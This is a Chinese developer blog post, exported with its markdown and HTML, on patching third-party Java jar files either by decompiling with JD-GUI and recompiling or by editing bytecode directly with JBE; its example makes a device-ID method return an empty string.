背景\n\n不管是做Android项目还是Java后端Web项目，我们一般都会引用各种三方库。遇到特殊需求时，可能需要修改jar包中的代码。本文以实际示例讲解一些基本方法，方便大家快速入坑。\n\n首先我们都知道直接解压jar包的话，都是class二进制文件，打开后是看不见代码的。之所以可以在开发环境中直接查看jar中的代码是因为IDE已经帮你反编译好了，才能看见Java源码。\n\n## 入坑\n\n如何修改这些jar包中的代码逻辑呢？大致有两种思路：\n\nA、反编译class为java源文件 -> 修改Java源码 -> 重新编译成class文件 -> 将新的class文件覆盖jar包中的原有文件\n\nB、解压得到class文件 -> 直接修改其中的二进制代码（即对应的字节码） -> 将修改后的class文件覆盖jar包中的原有文件\n\n**注：** 下文基于Java 8环境。\n\n## A方法\n\n这种方法也是最常见的方式，也相对较简单，但有一些弊端，后面会讲到。我们直接按步骤来走一遍。\n\n1、先下载 [JD-GUI](https://github.com/java-decompiler/jd-gui/releases) 最新版，得益于Java的跨平台特性，各操作系统都能跑。如果是Windows系统，直接运行exe即可，若是Linux，可以下载deb包进行安装，也可直接java命令运行jar，macOS也是类似，命令运行就行。\n\n2、通过JD-GUI我们打开想要修改的三方库jar包：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200324225832543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n比如这里有一个Util类，其中有一个获取手机IMEI的方法，我想把它改成永远返回空字符串。先把此class文件导出成java文件（选择Save后JD-GUI将自动反编译）：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200324230016144.png)\n\n3、修改Java代码，注意一点就是，在修改这种带参方法时，为了不影响外部调用出错，我们依然保留参数：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200324230335510.png)\n\n4、保存后我们将刚才的jar包和java文件放在同一个文件，执行命令：\n\n```bash\njavac -classpath test_a.jar Util.java\n```\n\n恭喜你，你肯定编译失败，会提示各种符号错误。因为这个类import了Android SDK中的相关包，原有的test_a.jar包是不包含的。所以我们同时需要 **原jar包** 和额外依赖的 **android.jar** （在你Android SDK目录下的platforms/android-xx文件夹中，xx表示API版本，一般选最新的就好）一起放在同一个目录。\n\n```bash\njavac -Djava.ext.dirs=/d/Downloads/test Util.java\n```\n\n5、编译产物就是Util.class文件，此时我们用压缩软件打开原test_a.jar包，把新的class文件复制粘贴到对应位置（一般来说用鼠标直接拖进去即可）：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325004920425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n6、检验一下，用JD-GUI重新打开jar包，看看那个方法：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325005254884.png)\n\n说明修改成功。\n\n## B方法\n\n上述A方法适用于普通的jar包修改，如果一旦jar包在发布编译时， **进行了代码混淆** ，那么解压修改再重新编译就很可能失败。此时我们若能直接修改class文件中的字节码，那就可以无视混淆了。\n\n比如这里我想修改test_b.jar中的一个方法b，让其永远返回空字符串：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325011539635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n直接解压jar包，用文本编辑器打开class文件后会发现都是十六进制字符，看不懂呀，我又不是机器：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325010750832.png)\n\n所以我们需要可以翻译这些编码的工具，有很多类似的。\n\n1、下载 [JBE](http://set.ee/jbe/) ，它也支持Win和Unix等系统平台，解压后运行其中的bat或sh脚本即可打开。然后我们打开需要修改的class文件：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325011826228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n从这里可以看见class文件中的各种常量池、成员变量和方法等等。找到我们需要修改的方法所对应的code。可以看见字节码指令已经被清楚地翻译出来。\n\n2、选择Code Editor可以直接修改这些指令。这里简单地介绍一下这里涉及到的指令，ldc将int, float或String型常量值从常量池中推送至栈顶，astore将栈顶引用型数值存入指定本地变量，aload将指定的引用类型本地变量复制到栈顶。后面的数字表示操作第几个常量或变量。\n\n所以这里我们的第0个就是入参，即context，第1个就是defaultAndroidId，以此类推。\n\n```assembly\nldc \"\"\nastore_1 // defaultAndroidId变量赋值\nldc \"\"\nastore_2 // androidId变量赋值\naload_0 // 开始引用context\ninvokevirtual android/content/Context/getContentResolver()Landroid/content/ContentResolver; // 并调用它的getContentResolver方法\nldc \"android_id\"\ninvokestatic android/provider/Settings$Secure/getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String; // 传入常量\"android_id\"，并调用getString方法\nastore_2 // 将上述方法调用返回结果赋值给androidId变量\naload_2 // 引用已赋值的变量，传入下面的isEmpty方法\ninvokestatic android/text/TextUtils/isEmpty(Ljava/lang/CharSequence;)Z\nifeq 15 // 若判断返回true则跳转第15行\nldc \"\"\nastore_2\naload_2 // 这里是第15行指令\nareturn\n```\n\n3、搞清楚含义之后，就可以为所欲为了。直接删掉相关逻辑，让方法直接返回空字符串：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325014830223.png)\n\n4、点击Save method后，将此修改后的class粘贴到原来的jar包中覆盖旧class即可（和A方法中的最后步骤一样）。用JD-GUI打开检验一下：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325014619860.png)\n\n## 其他注意事项\n\n1、我最开始用的Java 13作为编译环境，但13的javac命令已经不支持-Djava.ext.dirs，目前暂时没有探究替代方法，所以又换回了Java 8。\n\n2、在修改jar包时要确定其编译时所用的Java版本，我们需要与之一致，用JBE可以查看Major Version：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325015912615.png)\n\n3、关于字节码指令大全，建议大家参考官方文档（JVM规范，见参考链接），网上搜出来的二次资料可能不保险。\n\n## 参考\n\n- [在不重新编译的情况下直接修改Java Class文件中的内容](https://lucumt.info/post/modify-java-class-file-content-directly/)\n\n- [Java虚拟机规范](https://docs.oracle.com/javase/specs/jvms/se8/html/index.html)\n","source":"_posts/2020-03-24-快速修改字节码并重打jar包.md","raw":"---\nlayout:     post\ntitle:      快速修改字节码并重打jar包\nsubtitle:   探索发现。\ndate:       2020-03-24\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Java\n    - Android\n---\n\n## 背景\n\n不管是做Android项目还是Java后端Web项目，我们一般都会引用各种三方库。遇到特殊需求时，可能需要修改jar包中的代码。本文以实际示例讲解一些基本方法，方便大家快速入坑。\n\n首先我们都知道直接解压jar包的话，都是class二进制文件，打开后是看不见代码的。之所以可以在开发环境中直接查看jar中的代码是因为IDE已经帮你反编译好了，才能看见Java源码。\n\n## 入坑\n\n如何修改这些jar包中的代码逻辑呢？大致有两种思路：\n\nA、反编译class为java源文件 -> 修改Java源码 -> 重新编译成class文件 -> 将新的class文件覆盖jar包中的原有文件\n\nB、解压得到class文件 -> 直接修改其中的二进制代码（即对应的字节码） -> 将修改后的class文件覆盖jar包中的原有文件\n\n**注：** 下文基于Java 8环境。\n\n## A方法\n\n这种方法也是最常见的方式，也相对较简单，但有一些弊端，后面会讲到。我们直接按步骤来走一遍。\n\n1、先下载 [JD-GUI](https://github.com/java-decompiler/jd-gui/releases) 最新版，得益于Java的跨平台特性，各操作系统都能跑。如果是Windows系统，直接运行exe即可，若是Linux，可以下载deb包进行安装，也可直接java命令运行jar，macOS也是类似，命令运行就行。\n\n2、通过JD-GUI我们打开想要修改的三方库jar包：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200324225832543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n比如这里有一个Util类，其中有一个获取手机IMEI的方法，我想把它改成永远返回空字符串。先把此class文件导出成java文件（选择Save后JD-GUI将自动反编译）：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200324230016144.png)\n\n3、修改Java代码，注意一点就是，在修改这种带参方法时，为了不影响外部调用出错，我们依然保留参数：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200324230335510.png)\n\n4、保存后我们将刚才的jar包和java文件放在同一个文件，执行命令：\n\n```bash\njavac -classpath test_a.jar Util.java\n```\n\n恭喜你，你肯定编译失败，会提示各种符号错误。因为这个类import了Android SDK中的相关包，原有的test_a.jar包是不包含的。所以我们同时需要 **原jar包** 和额外依赖的 **android.jar** （在你Android SDK目录下的platforms/android-xx文件夹中，xx表示API版本，一般选最新的就好）一起放在同一个目录。\n\n```bash\njavac -Djava.ext.dirs=/d/Downloads/test Util.java\n```\n\n5、编译产物就是Util.class文件，此时我们用压缩软件打开原test_a.jar包，把新的class文件复制粘贴到对应位置（一般来说用鼠标直接拖进去即可）：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325004920425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n6、检验一下，用JD-GUI重新打开jar包，看看那个方法：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325005254884.png)\n\n说明修改成功。\n\n## B方法\n\n上述A方法适用于普通的jar包修改，如果一旦jar包在发布编译时， **进行了代码混淆** ，那么解压修改再重新编译就很可能失败。此时我们若能直接修改class文件中的字节码，那就可以无视混淆了。\n\n比如这里我想修改test_b.jar中的一个方法b，让其永远返回空字符串：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325011539635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n直接解压jar包，用文本编辑器打开class文件后会发现都是十六进制字符，看不懂呀，我又不是机器：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325010750832.png)\n\n所以我们需要可以翻译这些编码的工具，有很多类似的。\n\n1、下载 [JBE](http://set.ee/jbe/) ，它也支持Win和Unix等系统平台，解压后运行其中的bat或sh脚本即可打开。然后我们打开需要修改的class文件：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325011826228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n从这里可以看见class文件中的各种常量池、成员变量和方法等等。找到我们需要修改的方法所对应的code。可以看见字节码指令已经被清楚地翻译出来。\n\n2、选择Code Editor可以直接修改这些指令。这里简单地介绍一下这里涉及到的指令，ldc将int, float或String型常量值从常量池中推送至栈顶，astore将栈顶引用型数值存入指定本地变量，aload将指定的引用类型本地变量复制到栈顶。后面的数字表示操作第几个常量或变量。\n\n所以这里我们的第0个就是入参，即context，第1个就是defaultAndroidId，以此类推。\n\n```assembly\nldc \"\"\nastore_1 // defaultAndroidId变量赋值\nldc \"\"\nastore_2 // androidId变量赋值\naload_0 // 开始引用context\ninvokevirtual android/content/Context/getContentResolver()Landroid/content/ContentResolver; // 并调用它的getContentResolver方法\nldc \"android_id\"\ninvokestatic android/provider/Settings$Secure/getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String; // 传入常量\"android_id\"，并调用getString方法\nastore_2 // 将上述方法调用返回结果赋值给androidId变量\naload_2 // 引用已赋值的变量，传入下面的isEmpty方法\ninvokestatic android/text/TextUtils/isEmpty(Ljava/lang/CharSequence;)Z\nifeq 15 // 若判断返回true则跳转第15行\nldc \"\"\nastore_2\naload_2 // 这里是第15行指令\nareturn\n```\n\n3、搞清楚含义之后，就可以为所欲为了。直接删掉相关逻辑，让方法直接返回空字符串：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325014830223.png)\n\n4、点击Save method后，将此修改后的class粘贴到原来的jar包中覆盖旧class即可（和A方法中的最后步骤一样）。用JD-GUI打开检验一下：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325014619860.png)\n\n## 其他注意事项\n\n1、我最开始用的Java 13作为编译环境，但13的javac命令已经不支持-Djava.ext.dirs，目前暂时没有探究替代方法，所以又换回了Java 8。\n\n2、在修改jar包时要确定其编译时所用的Java版本，我们需要与之一致，用JBE可以查看Major Version：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200325015912615.png)\n\n3、关于字节码指令大全，建议大家参考官方文档（JVM规范，见参考链接），网上搜出来的二次资料可能不保险。\n\n## 参考\n\n- [在不重新编译的情况下直接修改Java Class文件中的内容](https://lucumt.info/post/modify-java-class-file-content-directly/)\n\n- [Java虚拟机规范](https://docs.oracle.com/javase/specs/jvms/se8/html/index.html)\n","slug":"快速修改字节码并重打jar包","published":1,"updated":"2024-03-25T07:31:25.861Z","comments":1,"photos":[],"link":"","_id":"cluaufh0z002hthe6g8ah60w8","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>不管是做Android项目还是Java后端Web项目，我们一般都会引用各种三方库。遇到特殊需求时，可能需要修改jar包中的代码。本文以实际示例讲解一些基本方法，方便大家快速入坑。</p>\n<p>首先我们都知道直接解压jar包的话，都是class二进制文件，打开后是看不见代码的。之所以可以在开发环境中直接查看jar中的代码是因为IDE已经帮你反编译好了，才能看见Java源码。</p>\n<h2 id=\"入坑\"><a href=\"#入坑\" class=\"headerlink\" title=\"入坑\"></a>入坑</h2><p>如何修改这些jar包中的代码逻辑呢？大致有两种思路：</p>\n<p>A、反编译class为java源文件 -&gt; 修改Java源码 -&gt; 重新编译成class文件 -&gt; 将新的class文件覆盖jar包中的原有文件</p>\n<p>B、解压得到class文件 -&gt; 直接修改其中的二进制代码（即对应的字节码） -&gt; 将修改后的class文件覆盖jar包中的原有文件</p>\n<p><strong>注：</strong> 下文基于Java 8环境。</p>\n<h2 id=\"A方法\"><a href=\"#A方法\" class=\"headerlink\" title=\"A方法\"></a>A方法</h2><p>这种方法也是最常见的方式，也相对较简单，但有一些弊端，后面会讲到。我们直接按步骤来走一遍。</p>\n<p>1、先下载 <a href=\"https://github.com/java-decompiler/jd-gui/releases\">JD-GUI</a> 最新版，得益于Java的跨平台特性，各操作系统都能跑。如果是Windows系统，直接运行exe即可，若是Linux，可以下载deb包进行安装，也可直接java命令运行jar，macOS也是类似，命令运行就行。</p>\n<p>2、通过JD-GUI我们打开想要修改的三方库jar包：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200324225832543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>比如这里有一个Util类，其中有一个获取手机IMEI的方法，我想把它改成永远返回空字符串。先把此class文件导出成java文件（选择Save后JD-GUI将自动反编译）：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200324230016144.png\" alt=\"在这里插入图片描述\"></p>\n<p>3、修改Java代码，注意一点就是，在修改这种带参方法时，为了不影响外部调用出错，我们依然保留参数：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200324230335510.png\" alt=\"在这里插入图片描述\"></p>\n<p>4、保存后我们将刚才的jar包和java文件放在同一个文件，执行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac -classpath test_a.jar Util.java</span><br></pre></td></tr></table></figure>\n\n<p>恭喜你，你肯定编译失败，会提示各种符号错误。因为这个类import了Android SDK中的相关包，原有的test_a.jar包是不包含的。所以我们同时需要 <strong>原jar包</strong> 和额外依赖的 <strong>android.jar</strong> （在你Android SDK目录下的platforms&#x2F;android-xx文件夹中，xx表示API版本，一般选最新的就好）一起放在同一个目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac -Djava.ext.dirs=/d/Downloads/test Util.java</span><br></pre></td></tr></table></figure>\n\n<p>5、编译产物就是Util.class文件，此时我们用压缩软件打开原test_a.jar包，把新的class文件复制粘贴到对应位置（一般来说用鼠标直接拖进去即可）：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325004920425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>6、检验一下，用JD-GUI重新打开jar包，看看那个方法：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325005254884.png\" alt=\"在这里插入图片描述\"></p>\n<p>说明修改成功。</p>\n<h2 id=\"B方法\"><a href=\"#B方法\" class=\"headerlink\" title=\"B方法\"></a>B方法</h2><p>上述A方法适用于普通的jar包修改，如果一旦jar包在发布编译时， <strong>进行了代码混淆</strong> ，那么解压修改再重新编译就很可能失败。此时我们若能直接修改class文件中的字节码，那就可以无视混淆了。</p>\n<p>比如这里我想修改test_b.jar中的一个方法b，让其永远返回空字符串：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325011539635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>直接解压jar包，用文本编辑器打开class文件后会发现都是十六进制字符，看不懂呀，我又不是机器：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325010750832.png\" alt=\"在这里插入图片描述\"></p>\n<p>所以我们需要可以翻译这些编码的工具，有很多类似的。</p>\n<p>1、下载 <a href=\"http://set.ee/jbe/\">JBE</a> ，它也支持Win和Unix等系统平台，解压后运行其中的bat或sh脚本即可打开。然后我们打开需要修改的class文件：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325011826228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>从这里可以看见class文件中的各种常量池、成员变量和方法等等。找到我们需要修改的方法所对应的code。可以看见字节码指令已经被清楚地翻译出来。</p>\n<p>2、选择Code Editor可以直接修改这些指令。这里简单地介绍一下这里涉及到的指令，ldc将int, float或String型常量值从常量池中推送至栈顶，astore将栈顶引用型数值存入指定本地变量，aload将指定的引用类型本地变量复制到栈顶。后面的数字表示操作第几个常量或变量。</p>\n<p>所以这里我们的第0个就是入参，即context，第1个就是defaultAndroidId，以此类推。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ldc &quot;&quot;</span><br><span class=\"line\">astore_1 // defaultAndroidId变量赋值</span><br><span class=\"line\">ldc &quot;&quot;</span><br><span class=\"line\">astore_2 // androidId变量赋值</span><br><span class=\"line\">aload_0 // 开始引用context</span><br><span class=\"line\">invokevirtual android/content/Context/getContentResolver()Landroid/content/ContentResolver; // 并调用它的getContentResolver方法</span><br><span class=\"line\">ldc &quot;android_id&quot;</span><br><span class=\"line\">invokestatic android/provider/Settings$Secure/getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String; // 传入常量&quot;android_id&quot;，并调用getString方法</span><br><span class=\"line\">astore_2 // 将上述方法调用返回结果赋值给androidId变量</span><br><span class=\"line\">aload_2 // 引用已赋值的变量，传入下面的isEmpty方法</span><br><span class=\"line\">invokestatic android/text/TextUtils/isEmpty(Ljava/lang/CharSequence;)Z</span><br><span class=\"line\">ifeq 15 // 若判断返回true则跳转第15行</span><br><span class=\"line\">ldc &quot;&quot;</span><br><span class=\"line\">astore_2</span><br><span class=\"line\">aload_2 // 这里是第15行指令</span><br><span class=\"line\">areturn</span><br></pre></td></tr></table></figure>\n\n<p>3、搞清楚含义之后，就可以为所欲为了。直接删掉相关逻辑，让方法直接返回空字符串：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325014830223.png\" alt=\"在这里插入图片描述\"></p>\n<p>4、点击Save method后，将此修改后的class粘贴到原来的jar包中覆盖旧class即可（和A方法中的最后步骤一样）。用JD-GUI打开检验一下：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325014619860.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"其他注意事项\"><a href=\"#其他注意事项\" class=\"headerlink\" title=\"其他注意事项\"></a>其他注意事项</h2><p>1、我最开始用的Java 13作为编译环境，但13的javac命令已经不支持-Djava.ext.dirs，目前暂时没有探究替代方法，所以又换回了Java 8。</p>\n<p>2、在修改jar包时要确定其编译时所用的Java版本，我们需要与之一致，用JBE可以查看Major Version：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325015912615.png\" alt=\"在这里插入图片描述\"></p>\n<p>3、关于字节码指令大全，建议大家参考官方文档（JVM规范，见参考链接），网上搜出来的二次资料可能不保险。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><p><a href=\"https://lucumt.info/post/modify-java-class-file-content-directly/\">在不重新编译的情况下直接修改Java Class文件中的内容</a></p>\n</li>\n<li><p><a href=\"https://docs.oracle.com/javase/specs/jvms/se8/html/index.html\">Java虚拟机规范</a></p>\n</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>不管是做Android项目还是Java后端Web项目，我们一般都会引用各种三方库。遇到特殊需求时，可能需要修改jar包中的代码。本文以实际示例讲解一些基本方法，方便大家快速入坑。</p>\n<p>首先我们都知道直接解压jar包的话，都是class二进制文件，打开后是看不见代码的。之所以可以在开发环境中直接查看jar中的代码是因为IDE已经帮你反编译好了，才能看见Java源码。</p>\n<h2 id=\"入坑\"><a href=\"#入坑\" class=\"headerlink\" title=\"入坑\"></a>入坑</h2><p>如何修改这些jar包中的代码逻辑呢？大致有两种思路：</p>\n<p>A、反编译class为java源文件 -&gt; 修改Java源码 -&gt; 重新编译成class文件 -&gt; 将新的class文件覆盖jar包中的原有文件</p>\n<p>B、解压得到class文件 -&gt; 直接修改其中的二进制代码（即对应的字节码） -&gt; 将修改后的class文件覆盖jar包中的原有文件</p>\n<p><strong>注：</strong> 下文基于Java 8环境。</p>\n<h2 id=\"A方法\"><a href=\"#A方法\" class=\"headerlink\" title=\"A方法\"></a>A方法</h2><p>这种方法也是最常见的方式，也相对较简单，但有一些弊端，后面会讲到。我们直接按步骤来走一遍。</p>\n<p>1、先下载 <a href=\"https://github.com/java-decompiler/jd-gui/releases\">JD-GUI</a> 最新版，得益于Java的跨平台特性，各操作系统都能跑。如果是Windows系统，直接运行exe即可，若是Linux，可以下载deb包进行安装，也可直接java命令运行jar，macOS也是类似，命令运行就行。</p>\n<p>2、通过JD-GUI我们打开想要修改的三方库jar包：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200324225832543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>比如这里有一个Util类，其中有一个获取手机IMEI的方法，我想把它改成永远返回空字符串。先把此class文件导出成java文件（选择Save后JD-GUI将自动反编译）：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200324230016144.png\" alt=\"在这里插入图片描述\"></p>\n<p>3、修改Java代码，注意一点就是，在修改这种带参方法时，为了不影响外部调用出错，我们依然保留参数：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200324230335510.png\" alt=\"在这里插入图片描述\"></p>\n<p>4、保存后我们将刚才的jar包和java文件放在同一个文件，执行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac -classpath test_a.jar Util.java</span><br></pre></td></tr></table></figure>\n\n<p>恭喜你，你肯定编译失败，会提示各种符号错误。因为这个类import了Android SDK中的相关包，原有的test_a.jar包是不包含的。所以我们同时需要 <strong>原jar包</strong> 和额外依赖的 <strong>android.jar</strong> （在你Android SDK目录下的platforms&#x2F;android-xx文件夹中，xx表示API版本，一般选最新的就好）一起放在同一个目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac -Djava.ext.dirs=/d/Downloads/test Util.java</span><br></pre></td></tr></table></figure>\n\n<p>5、编译产物就是Util.class文件，此时我们用压缩软件打开原test_a.jar包，把新的class文件复制粘贴到对应位置（一般来说用鼠标直接拖进去即可）：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325004920425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>6、检验一下，用JD-GUI重新打开jar包，看看那个方法：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325005254884.png\" alt=\"在这里插入图片描述\"></p>\n<p>说明修改成功。</p>\n<h2 id=\"B方法\"><a href=\"#B方法\" class=\"headerlink\" title=\"B方法\"></a>B方法</h2><p>上述A方法适用于普通的jar包修改，如果一旦jar包在发布编译时， <strong>进行了代码混淆</strong> ，那么解压修改再重新编译就很可能失败。此时我们若能直接修改class文件中的字节码，那就可以无视混淆了。</p>\n<p>比如这里我想修改test_b.jar中的一个方法b，让其永远返回空字符串：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325011539635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>直接解压jar包，用文本编辑器打开class文件后会发现都是十六进制字符，看不懂呀，我又不是机器：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325010750832.png\" alt=\"在这里插入图片描述\"></p>\n<p>所以我们需要可以翻译这些编码的工具，有很多类似的。</p>\n<p>1、下载 <a href=\"http://set.ee/jbe/\">JBE</a> ，它也支持Win和Unix等系统平台，解压后运行其中的bat或sh脚本即可打开。然后我们打开需要修改的class文件：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325011826228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>从这里可以看见class文件中的各种常量池、成员变量和方法等等。找到我们需要修改的方法所对应的code。可以看见字节码指令已经被清楚地翻译出来。</p>\n<p>2、选择Code Editor可以直接修改这些指令。这里简单地介绍一下这里涉及到的指令，ldc将int, float或String型常量值从常量池中推送至栈顶，astore将栈顶引用型数值存入指定本地变量，aload将指定的引用类型本地变量复制到栈顶。后面的数字表示操作第几个常量或变量。</p>\n<p>所以这里我们的第0个就是入参，即context，第1个就是defaultAndroidId，以此类推。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 